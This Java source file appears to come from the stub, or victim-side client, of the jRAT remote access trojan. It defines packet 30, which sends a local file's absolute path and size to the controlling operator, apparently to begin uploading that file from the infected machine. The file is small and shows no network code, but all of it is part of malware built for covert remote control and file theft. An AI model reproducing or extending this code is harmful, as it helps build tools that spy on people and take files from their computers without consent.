package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.common.io.StringWriter;

public class Packet30BeginClientUpload extends AbstractOutgoingPacket {
	
	private File file;
	
	public Packet30BeginClientUpload(File file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file.getAbsolutePath());
		dos.writeLong(file.length());
	}

	@Override
	public byte getPacketId() {
		return (byte) 30;
	}

}
